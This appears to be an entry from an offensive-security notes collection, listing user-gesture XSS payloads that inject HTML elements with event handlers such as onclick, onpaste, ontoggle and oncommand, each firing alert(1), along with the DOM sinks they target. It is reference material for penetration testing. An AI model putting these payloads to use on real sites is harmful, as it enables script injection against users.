---
title: User-Interaction-Required Event Handlers
slug: user-interaction-handlers
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/event-handler, sink/innerHTML]
inbound: []
---

# User-Interaction-Required Event Handlers

## Payload

```html
<xss onclick="alert(1)" style=display:block>test</xss>
```

## Variants

```html
<xss onmouseover="alert(1)" style=display:block>test</xss>
<xss onkeydown="alert(1)" contenteditable style=display:block>test</xss>
<xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<a onpaste="alert(1)" contenteditable>test</a>
<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>
<form onsubmit=alert(1)><input type=submit>
<input onchange=alert(1) value=xss>
<input oninput=alert(1) value=xss>
<body onwheel=alert(1)>
<body ontouchstart=alert(1)>
<body ontouchmove=alert(1)>
<body ontouchend=alert(1)>
<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>
<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>
<xss onscrollend=alert(1) style="display:block;overflow:auto;width:100px;height:100px"><div style=width:1000px>scroll</div></xss>
```

## Context

All variants require a user gesture to fire. Used when no auto-fire handler works (strict gesture policies, Trusted Types enforcement of event handlers, or when the target must simulate a user action). `onclick`/`onmouseover` are the broadest. `ontouchstart`/`ontouchmove` are mobile-specific. The `popover`/`oncommand` variants are Chrome 114+/Chromium new APIs. Sink: `innerHTML`, `outerHTML`, `document.write`.

## Provenance

- Distilled from: `../../techniques/dom-xss/event-handler-matrix.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Event Handler Matrix](../../techniques/dom-xss/event-handler-matrix.md)
